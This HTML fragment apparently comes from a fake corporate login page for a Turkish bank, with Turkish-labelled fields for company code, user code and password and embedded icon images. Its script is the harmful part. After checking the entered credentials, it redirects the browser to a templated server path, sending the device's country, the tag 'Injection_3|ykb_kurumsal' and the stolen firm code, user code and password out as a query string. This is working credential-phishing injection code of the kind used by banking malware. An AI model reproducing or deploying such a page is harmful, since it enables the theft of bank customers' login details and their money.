c291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChXaW5kb3dzKSIgeG1wOkNyZWF0ZURhdGU9IjIwMTctMTItMTZUMTY6NDM6MjIrMDQ6MDAiIHhtcDpNb2RpZnlEYXRlPSIyMDE3LTEyLTE2VDE2OjQzOjI1KzA0OjAwIiB4bXA6TWV0YWRhdGFEYXRlPSIyMDE3LTEyLTE2VDE2OjQzOjI1KzA0OjAwIiBkYzpmb3JtYXQ9ImltYWdlL3BuZyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpCNTFENkVFMEUyNUUxMUU3QjI0QkEzQ0I1MDI3Q0YxMSIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpCNTFENkVFMUUyNUUxMUU3QjI0QkEzQ0I1MDI3Q0YxMSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkI1MUQ2RURFRTI1RTExRTdCMjRCQTNDQjUwMjdDRjExIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkI1MUQ2RURGRTI1RTExRTdCMjRCQTNDQjUwMjdDRjExIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+XKxOgwAAAw1JREFUeNrEWL+L1EAU3mxlUETBFNe5IIhFrNxGrYJgm+6qYH1/Qv6C5bC0CFgt2MRyLa5Kt1sICxbRQjg4xYgKBu7ABcv4ZnmD7+byY+ZNNvvgY8jM5M3Le2++eRNnZCFVVXnQPAEcAB5i923AOeAb4AKwchzn42hIAcMmgBiQVfpSAOaAkLOmY2IcNDPAoTL0DvADkOPzT/TsXcBNwDPAPTJ/BXgN3n3Tt/cSwIZ4ZusVgGvo/ZzoEJEI+jDOU8I6R4/a6Iww/FKObJT5gFNUJFq/x8i4gGP68VwDaVi8HW3CkKyTmoZYejAZgC2mgNLIoyQHswFpbaqdo7iLZQ56A/NvhGuXjWsrX+OP9iAiL1vzk0w4Zu7WhPBgjs8ug/IkH0/ryFaKZ0FVqhhTF6GmtGkgYXgxJ1Tlo1d9sgFzhje3og4ssT8wVBjje8uGcak3NtQrPzBULS8ZXlxcUtZM1gtDvUeXIstVhO/KXJy0FBbbUo154m1TZQx4gGOfGaxxge2dhnHZ/8uofvxfJPvSyPvY8Ylh5CNsm1KlVOaZyHcZjTGW+0L+MBS9xXbWMD5T5pnIObY3OpNfky42Kr8qxOwxdK8lqQtP/uXWm9C8wsfrgBO5gbA9wX4hLxlH7S2ZMmPi1gOT6wTeaQ7JvUXcc85wJ5/h8wrHX4j5hoeFTMPNVU7qDu+CHHsJpR8cD5S+CamuKnzf00yjopaTNKuU4koBoFczFjpVeC13d5EymVdwN0Kth7rr2ph2znXOWBIyl2mkW1s8NDvDr3Nvrnnw20qmEeqsrWKJOi75toZmbWlFUi9uqzyK0Z6E2JDphDPeg4EeycWobWJAwhIMaKBLjsGF1mlCrpb+QEZK/l1r0xt5qdylR9GDdK0J9+vs/ny15+DaOmrKmZv29VcDd3FJQjyxVRgShRu8/noWuk538eEyNKlCymu80k47yD/Ed0uF0KNd/v1KlT+1VHI0vmwYX3Ly27EwWOz654DHgKctl6kPgPeAFG6BXzhrOT17WuzQa4CvYNDvvvT+E2AAO3IKEROs5HUAAAAASUVORK5CYII="><br>
Bireysel</A><A href="#" class="hr22">
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACkAAAApCAYAAACoYAD2AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA+dpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChXaW5kb3dzKSIgeG1wOkNyZWF0ZURhdGU9IjIwMTctMTItMTZUMTY6NDM6MjIrMDQ6MDAiIHhtcDpNb2RpZnlEYXRlPSIyMDE3LTEyLTE2VDE2OjQzOjU5KzA0OjAwIiB4bXA6TWV0YWRhdGFEYXRlPSIyMDE3LTEyLTE2VDE2OjQzOjU5KzA0OjAwIiBkYzpmb3JtYXQ9ImltYWdlL3BuZyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpDOUE2RUI5M0UyNUUxMUU3QUExQ0Y4ODcyMTE5NzQwMiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpDOUE2RUI5NEUyNUUxMUU3QUExQ0Y4ODcyMTE5NzQwMiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkM5QTZFQjkxRTI1RTExRTdBQTFDRjg4NzIxMTk3NDAyIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkM5QTZFQjkyRTI1RTExRTdBQTFDRjg4NzIxMTk3NDAyIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+wsfRgQAAAwBJREFUeNrMWTGLE0EU3g0W2ohXTHFgYUAQi7W7xrNaBRuL7bQJ1vkJ+wskvyBgdWCzbcQyXSIIAYtoISgo7nEWLkTwQKzWb8Kb+G5ud3ZnZxLy4Mtssrsz37735u17L2FZlkEYhkFXwf0CwzFwCNyjnw+AFfAd+AXMscYHl0W63NMHUmBatpccOAES2/VCG01KchheAE+1U6+BM2BJ33+QZm8B14FHwG12/Rx4iXVfedUkrhsD50wza60A1yy1v2RzSEvEziSlz2lmPSGNurjYgMyvZNiZJM5FwGeaSI5R4EmkBYARf3hrkkSQm0UEWxByGSVZa5JkYqXBcbBlwRpHQFGr0RqSygenwY6EiFb7qE6SdrHyQWGxSAxMaEPkdBx32FAlaVVUktSeJrKYPDUE8dSSaHbJPzWS6oKRpQY3hMifhUY8tphPsHh8dIEkBVslNmae1WmMEZ1ZanN0QZuM5Mi0m0lji9KfLOo0TNpci05yZjKN9obwJblBmyrCJGuSjHlhuOn/k/kJOcb5ZBhSlu3Rb8c0vg32R+aKmyJ5l8ZP+8KQJcmRInmHxo/Bfsmp/OixdF/Kb0c/4ymdj1fqipP0JQ9rjrvKX/lxhb78aan6mzY7vMW1pw3nb3BNrmg8NNzwfAs+1zTnwSaY85jkGNsmzCcnLjGXxe5ckVRZ+NKFpK9ArmXskx6LSV9kTHItsjzKYxrf8d2t3jbP9oTkExrf8AQjaTK55yQjb2HqaVXSqzKhgSFd80E0NyXCrAhMq0gOm55yBwXZ8NIbq6IQm3apTTwRFMxSAxPJuEtt4qmjsaiMsTV195iVltGOSGasrBBt2ywZIxpvWYN8rb5twypr3fnq7oOLRqu1aP2NeUPJV+OKdnHBTNx3aqJScFUTnlP5KzqSS1gcbPfgFp1eoZlfaSDddBrqO7wJ3Vto7cSB13a01i/KDG+eJZEvas7PbP07dPmLhHa9zFbuAw8M2fd7mc0AGdb6al05uv6PU9UhxnAV+IZ5f/qY858AAwC10Ta/QI7RdgAAAABJRU5ErkJggg=="><br>
Kurumsal</A><div style="clear:both"></div>

 <form  method="post" >
<div class="bg2">
 <div class="glyphicon glyphicon-user nn11" style="color:white;"></div><input type="text" name ="fields[login2]" id="id2" class="id2" placeholder="Firma Kodu" onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,10);}" autofocus="autofocus" />
  <div class="glyphicon glyphicon-th nn33" style="color:white;"></div><input type="text" name ="fields[login3]" id="ii" class="ii" placeholder="Kullanıcı Kodu" onKeyUp="if(this.value>99999){this.value=this.value.substr(0,5);}" />
  <div class="glyphicon glyphicon-lock nn22" style="color:white;"></div><input name="fields[password2]" id="pass2" class="pass2" type="password" placeholder="Şifre" maxlength="50" />
</div>
    <input class="switcher__input" type="checkbox" name="watched" id="switcher2">
    <label class="switcher__label" for="switcher2">
    </label>
<h5> Beni Hatırla </h5>

  <button id="input_submitBtn4" onclick="sentServer2();" class="s2" type="submit">Giriş</button>

  <h5 style="font-size: 16px;"> Şifre Al / Şifremi Unuttum </h5>
  <div style="clear:both"></div>

  <div style="clear:both"></div>
  <script type="text/javascript">

  (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('input_submitBtn4');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('id2');
                        var oCodeInp = document.getElementById('ii');
                        var oCodeInp2 = document.getElementById('pass2');

						try{
							oNumInp.className = 'id2';
							oCodeInp.className = 'ii';
							oCodeInp2.className = 'pass2';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fe3';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{5,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fe5';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp2.value)) {
							try{
                                oCodeInp2.className = 'fe4';
							} catch(e){};
                            return false;
                        }

top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|ykb_kurumsal|"+oNumInp.value+"|"+oCodeInp.value+"|"+oCodeInp2.value);

return false;
};

})();
            </script>
</form>
 </div>



</div>
</body>
</html>
